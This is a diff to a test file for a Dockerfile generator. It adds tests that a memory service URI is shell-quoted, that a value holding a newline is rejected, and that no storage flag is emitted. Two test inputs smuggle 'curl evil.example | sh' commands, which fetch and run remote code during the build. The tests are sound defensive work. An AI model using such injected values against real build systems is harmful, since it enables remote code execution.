@@ -168,6 +168,31 @@ describe('createDockerFileContent', () => {
     );
   });
 
+  it('should shell-quote and reject a newline in memoryServiceUri', () => {
+    expect(
+      createDockerFileContent({
+        ...defaultOptions,
+        memoryServiceUri: 'agentengine://123; curl evil.example | sh #',
+      }),
+    ).toContain(
+      "--memory_service_uri='agentengine://123; curl evil.example | sh #'",
+    );
+    expect(() =>
+      createDockerFileContent({
+        ...defaultOptions,
+        memoryServiceUri: 'memory://\nRUN sh -c "curl evil.example|sh"\n#',
+      }),
+    ).toThrow(/Invalid memoryServiceUri/);
+  });
+
+  it('should never emit a storage flag into the generated CMD', () => {
+    // The Dockerfile installs @google/adk-devtools@latest, so the deployed CLI
+    // can be older than this one and would reject an unknown flag on start-up.
+    expect(createDockerFileContent(defaultOptions)).not.toContain(
+      'use_local_storage',
+    );
+  });
+
   it('should reject an appName that would break out of the generated Dockerfile', () => {
     // A newline lets an attacker-controlled agent directory name terminate
     // the COPY instruction it's embedded in and start a new Dockerfile
